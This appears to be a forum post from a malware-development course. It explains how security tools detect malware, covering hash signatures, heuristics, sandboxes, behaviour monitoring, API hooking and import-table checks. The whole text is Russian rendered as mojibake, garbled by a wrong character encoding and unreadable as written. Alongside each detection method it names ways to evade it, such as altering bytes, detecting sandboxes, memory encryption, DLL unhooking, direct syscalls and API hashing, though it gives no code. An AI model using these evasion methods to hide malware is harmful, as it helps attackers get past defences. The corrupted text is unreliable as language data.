<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –ø–æ —Ö–µ—à—É</b><br />
<br />
–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –ø–æ —Ö–µ—à—É —è–≤–ª—è–µ—Ç—Å—è –ø–æ–¥–º–Ω–æ–∂–µ—Å—Ç–≤–æ–º —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –ø–æ —Å–∏–≥–Ω–∞—Ç—É—Ä–µ. –≠—Ç–æ –æ—á–µ–Ω—å –ø—Ä–æ—Å—Ç–æ–π –º–µ—Ç–æ–¥ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è, –∏ —ç—Ç–æ —Å–∞–º—ã–π –±—ã—Å—Ç—Ä—ã–π –∏ –ø—Ä–æ—Å—Ç–æ–π —Å–ø–æ—Å–æ–±, –∫–æ—Ç–æ—Ä—ã–º —Å–∏—Å—Ç–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –º–æ–∂–µ—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û. –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ —Ö–µ—à–µ–π (–Ω–∞–ø—Ä–∏–º–µ—Ä, MD5, SHA256) –∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö. –•–µ—à —Ñ–∞–π–ª–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –±—É–¥–µ—Ç —Å—Ä–∞–≤–Ω–∏–≤–∞—Ç—å—Å—è —Å –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö —Ö–µ—à–µ–π —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å, –µ—Å—Ç—å –ª–∏ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ.<br />
<br />
–£–∫–ª–æ–Ω–µ–Ω–∏–µ –æ—Ç –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –ø–æ —Ö–µ—à—É —á—Ä–µ–∑–≤—ã—á–∞–π–Ω–æ –ø—Ä–æ—Å—Ç–æ–µ, —Ö–æ—Ç—è, –≤–µ—Ä–æ—è—Ç–Ω–æ, —ç—Ç–æ–≥–æ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å–∞–º–æ –ø–æ —Å–µ–±–µ. –ò–∑–º–µ–Ω—è—è —Ö–æ—Ç—è –±—ã 1 –±–∞–π—Ç –≤ —Ñ–∞–π–ª–µ, —Ö–µ—à —Ñ–∞–π–ª–∞ –∏–∑–º–µ–Ω–∏—Ç—Å—è –¥–ª—è –ª—é–±–æ–≥–æ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è, –∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, —Ñ–∞–π–ª –±—É–¥–µ—Ç –∏–º–µ—Ç—å —É–Ω–∏–∫–∞–ª—å–Ω—ã–π —Ö–µ—à —Ñ–∞–π–ª–∞.<br />
<br />
<b>–≠–≤—Ä–∏—Å—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ</b><br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É –º–µ—Ç–æ–¥—ã –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –ø–æ —Å–∏–≥–Ω–∞—Ç—É—Ä–µ –ª–µ–≥–∫–æ –æ–±—Ö–æ–¥—è—Ç—Å—è —Å –Ω–µ–∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω—ã–º–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è–º–∏ –≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º —Ñ–∞–π–ª–µ, –±—ã–ª–æ –≤–≤–µ–¥–µ–Ω–æ —ç–≤—Ä–∏—Å—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ, —á—Ç–æ–±—ã –≤—ã—è–≤–ª—è—Ç—å –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã—Ö, –Ω–æ–≤—ã—Ö –∏ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –≤–µ—Ä—Å–∏—è—Ö —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û. –í –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, —ç–≤—Ä–∏—Å—Ç–∏—á–µ—Å–∫–∏–µ –º–æ–¥–µ–ª–∏ –º–æ–≥—É—Ç —Å–æ—Å—Ç–æ—è—Ç—å –∏–∑ –æ–¥–Ω–æ–≥–æ –∏–ª–∏ –æ–±–æ–∏—Ö —Å–ª–µ–¥—É—é—â–∏—Ö –º–µ—Ö–∞–Ω–∏–∑–º–æ–≤:<br />
<ul>
<li data-xf-list-type="ul">–°—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π —ç–≤—Ä–∏—Å—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ - –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è –¥–µ–∫–æ–º–ø–∏–ª—è—Ü–∏—é –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –∏ —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–≤ –∫–æ–¥–∞ —Å –∏–∑–≤–µ—Å—Ç–Ω—ã–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –ü–û, –∫–æ—Ç–æ—Ä–æ–µ —É–∂–µ –∏–∑–≤–µ—Å—Ç–Ω–æ –∏ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö —ç–≤—Ä–∏—Å—Ç–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞. –ï—Å–ª–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ–Ω—Ç –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–æ–¥–∞ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç —á–µ–º—É-–ª–∏–±–æ –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö —ç–≤—Ä–∏—Å—Ç–∏—á–µ—Å–∫–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞, –ø—Ä–æ–≥—Ä–∞–º–º–∞ –ø–æ–º–µ—á–∞–µ—Ç—Å—è.</li>
<li data-xf-list-type="ul">–î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π —ç–≤—Ä–∏—Å—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ - –ø—Ä–æ–≥—Ä–∞–º–º–∞ –ø–æ–º–µ—â–∞–µ—Ç—Å—è –≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—É—é —Å—Ä–µ–¥—É –∏–ª–∏ –ø–µ—Å–æ—á–Ω–∏—Ü—É, –∫–æ—Ç–æ—Ä–∞—è –∑–∞—Ç–µ–º –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç—Å—è —Å–∏—Å—Ç–µ–º–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –ª—é–±—ã—Ö –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π.</li>
</ul><b>–î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π —ç–≤—Ä–∏—Å—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ (–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –≤ –ø–µ—Å–æ—á–Ω–∏—Ü–µ)</b><br />
<br />
–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –≤ –ø–µ—Å–æ—á–Ω–∏—Ü–µ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –ø–æ–≤–µ–¥–µ–Ω–∏–µ —Ñ–∞–π–ª–∞, –≤—ã–ø–æ–ª–Ω—è—è –µ–≥–æ –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥–µ. –ü—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ —Å–∏—Å—Ç–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –±—É–¥–µ—Ç –∏—Å–∫–∞—Ç—å –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –∏–ª–∏ –¥–µ–π—Å—Ç–≤–∏—è, –∫–æ—Ç–æ—Ä—ã–µ –∫–ª–∞—Å—Å–∏—Ñ–∏—Ü–∏—Ä—É—é—Ç—Å—è –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ. –ù–∞–ø—Ä–∏–º–µ—Ä, –≤—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –¥–µ–π—Å—Ç–≤–∏–µ–º, –Ω–æ –≤—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏, –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —à–µ–ª–ª-–∫–æ–¥–∞, –∑–∞–ø–∏—Å—å —à–µ–ª–ª-–∫–æ–¥–∞ –≤ –ø–∞–º—è—Ç—å –∏ –µ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –≤ —ç—Ç–æ–π –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ —Å—á–∏—Ç–∞–µ—Ç—Å—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –ø–æ–≤–µ–¥–µ–Ω–∏–µ–º.<br />
<br />
–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –≤—Å—Ç—Ä–∞–∏–≤–∞—é—Ç —Ç–µ—Ö–Ω–∏–∫–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –ø–µ—Å–æ—á–Ω–∏—Ü—ã, —á—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Å—Ä–µ–¥—É –ø–µ—Å–æ—á–Ω–∏—Ü—ã. –ï—Å–ª–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ –æ–Ω–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤ –ø–µ—Å–æ—á–Ω–∏—Ü–µ, —Ç–æ–≥–¥–∞ –æ–Ω–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –±–µ–∑–≤—Ä–µ–¥–Ω—ã–π –∫–æ–¥, –≤ –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ - –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥.<br />
<br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –Ω–∞ –æ—Å–Ω–æ–≤–µ –ø–æ–≤–µ–¥–µ–Ω–∏—è</b><br />
<br />
–ö–∞–∫ —Ç–æ–ª—å–∫–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è, —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø—Ä–æ–¥–æ–ª–∂–∞—é—Ç –∏—Å–∫–∞—Ç—å –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ, —Å–æ–≤–µ—Ä—à–∞–µ–º–æ–µ —Ä–∞–±–æ—Ç–∞—é—â–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º. –°–∏—Å—Ç–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –±—É–¥–µ—Ç –∏—Å–∫–∞—Ç—å –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã, —Ç–∞–∫–∏–µ –∫–∞–∫ –∑–∞–≥—Ä—É–∑–∫–∞ DLL, –≤—ã–∑–æ–≤ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ API Windows –∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É. –ö–∞–∫ —Ç–æ–ª—å–∫–æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ, —Å–∏—Å—Ç–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø—Ä–æ–≤–æ–¥–∏—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ –ø–∞–º—è—Ç–∏. –ï—Å–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π, –æ–Ω –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è.<br />
<br />
–û–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –º–æ–≥—É—Ç –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ –±–µ–∑ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –≤ –ø–∞–º—è—Ç–∏. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∏–Ω—ä–µ–∫—Ü–∏—é –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ notepad.exe –∏ –ø–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É, —ç—Ç–æ, –≤–µ—Ä–æ—è—Ç–Ω–æ, –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ–º—É –∑–∞–≤–µ—Ä—à–µ–Ω–∏—é –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–∑-–∑–∞ –≤—ã—Å–æ–∫–æ–π –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ —Ç–æ–≥–æ, —á—Ç–æ —ç—Ç–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–∞—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å.<br />
<br />
–õ—É—á—à–∏–π —Å–ø–æ—Å–æ–± –∏–∑–±–µ–∂–∞—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –Ω–∞ –æ—Å–Ω–æ–≤–µ –ø–æ–≤–µ–¥–µ–Ω–∏—è - –∑–∞—Å—Ç–∞–≤–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å –≤–µ—Å—Ç–∏ —Å–µ–±—è –∫–∞–∫ –º–æ–∂–Ω–æ –±–æ–ª–µ–µ –±–µ–∑–≤—Ä–µ–¥–Ω–æ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∏–∑–±–µ–≥–∞—Ç—å –∑–∞–ø—É—Å–∫–∞ –¥–æ—á–µ—Ä–Ω–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ cmd.exe). –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ –ø–∞–º—è—Ç–∏ –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏ —Å –ø–æ–º–æ—â—å—é —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –ø–∞–º—è—Ç–∏. –≠—Ç–æ –±–æ–ª–µ–µ —Å–ª–æ–∂–Ω–∞—è —Ç–µ–º–∞, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –æ–±—Å—É–∂–¥–∞—Ç—å—Å—è –≤ –±—É–¥—É—â–∏—Ö –º–æ–¥—É–ª—è—Ö.<br />
<br />
<b>API-–ø–µ—Ä–µ—Ö–≤–∞—Ç</b><br />
<br />
API-–ø–µ—Ä–µ—Ö–≤–∞—Ç - —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è —Å–∏—Å—Ç–µ–º–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º EDR, –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏ –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è. API-–ø–µ—Ä–µ—Ö–≤–∞—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –ø—É—Ç–µ–º –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —á–∞—Å—Ç–æ –∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª—è–µ–º—ã—Ö API –∏ –∑–∞—Ç–µ–º –∞–Ω–∞–ª–∏–∑–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —ç—Ç–∏—Ö API –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏. –≠—Ç–æ —Ö–æ—Ä–æ—à–∏–π —Å–ø–æ—Å–æ–± –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è, –ø–æ—Ç–æ–º—É —á—Ç–æ —ç—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–∏—Å—Ç–µ–º–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–∏–¥–µ—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ, –ø–µ—Ä–µ–¥–∞–Ω–Ω–æ–µ API, –ø–æ—Å–ª–µ –µ–≥–æ –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∏ –∏–ª–∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏.<br />
<br />
–≠—Ç–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —Å—á–∏—Ç–∞–µ—Ç—Å—è –∫–æ–º–±–∏–Ω–∞—Ü–∏–µ–π –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏ –∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ –ø–æ–≤–µ–¥–µ–Ω–∏—è.<br />
<br />
–î–∏–∞–≥—Ä–∞–º–º–∞ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –∞–ª–≥–æ—Ä–∏—Ç–º API-–ø–µ—Ä–µ—Ö–≤–∞—Ç–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732182826.png"
		data-src="https://osint42.org/attachments/1746732182826-png.55/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732182826-png.55/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732182826.png"
			title="1746732182826.png"
			width="948" height="337" loading="lazy" />
	</div><br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–ø–æ—Å–æ–±–æ–≤ –æ–±–æ–π—Ç–∏ API-–ø–µ—Ä–µ—Ö–≤–∞—Ç, —Ç–∞–∫–∏–µ –∫–∞–∫ –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ DLL –∏ –ø—Ä—è–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã. –≠—Ç–∏ —Ç–µ–º—ã –±—É–¥—É—Ç —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω—ã –≤ –±—É–¥—É—â–∏—Ö –º–æ–¥—É–ª—è—Ö.<br />
<br />
<b>–ü—Ä–æ–≤–µ—Ä–∫–∞ IAT</b><br />
<br />
–û–¥–Ω–∏–º –∏–∑ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤ –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ PE, —è–≤–ª—è–µ—Ç—Å—è —Ç–∞–±–ª–∏—Ü–∞ –∞–¥—Ä–µ—Å–æ–≤ –∏–º–ø–æ—Ä—Ç–∞ –∏–ª–∏ IAT. –ß—Ç–æ–±—ã –∫—Ä–∞—Ç–∫–æ —Å—É–º–º–∏—Ä–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å IAT, –æ–Ω–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–º–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ PE –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –û–Ω–∞ —Ç–∞–∫–∂–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ (DLL), –∫–æ—Ç–æ—Ä—ã–µ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É—é—Ç —ç—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏. –≠—Ç–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —Ü–µ–Ω–Ω–∞ –¥–ª—è —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∞ –∑–Ω–∞–µ—Ç, –∫–∞–∫–∏–µ WinAPI –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Ñ–∞–π–ª–æ–≤ –≤ ransomware –≤–µ—Ä–æ—è—Ç–Ω–æ, –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏ —Ñ—É–Ω–∫—Ü–∏–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Ñ–∞–π–ª–∞–º–∏. –ö–æ–≥–¥–∞ —Å–∏—Å—Ç–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–∏–¥–∏—Ç IAT, —Å–æ–¥–µ—Ä–∂–∞—â—É—é —ç—Ç–∏ —Ç–∏–ø—ã —Ñ—É–Ω–∫—Ü–∏–π, —Ç–∞–∫–∏—Ö –∫–∞–∫ CreateFileaA/W, SetFilePointer, Read/WriteFile, CreateHash, CryptHashData, CryptGetHashParam, —Ç–æ–≥–¥–∞ –∏–ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –ø–æ–º–µ—á–∞–µ—Ç—Å—è, –∏–ª–∏ –Ω–∞ –Ω–µ–µ —É–¥–µ–ª—è–µ—Ç—Å—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–µ –≤–Ω–∏–º–∞–Ω–∏–µ.<br />
<br />
–ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–æ, –∫–∞–∫ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç dumpbin.exe –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ IAT –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732195455.png"
		data-src="https://osint42.org/attachments/1746732195455-png.56/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732195455-png.56/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732195455.png"
			title="1746732195455.png"
			width="641" height="719" loading="lazy" />
	</div><br />
<br />
–û–¥–∏–Ω –∏–∑ —Å–ø–æ—Å–æ–±–æ–≤ –æ–±—Ö–æ–¥–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è IAT - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è API, –æ –∫–æ—Ç–æ—Ä–æ–º –±—É–¥–µ—Ç —Ä–∞—Å—Å–∫–∞–∑–∞–Ω–æ –≤ –±—É–¥—É—â–∏—Ö –º–æ–¥—É–ª—è—Ö.<br />
<br />
<b>–†—É—á–Ω–æ–π –∞–Ω–∞–ª–∏–∑</b><br />
<br />
–ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ –æ–±—Ö–æ–¥ –≤—Å–µ—Ö –≤—ã—à–µ—É–ø–æ–º—è–Ω—É—Ç—ã—Ö –º–µ—Ö–∞–Ω–∏–∑–º–æ–≤ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è, –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –≤—Å–µ —Ä–∞–≤–Ω–æ –º–æ–≥—É—Ç –≤—Ä—É—á–Ω—É—é –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û.<br />
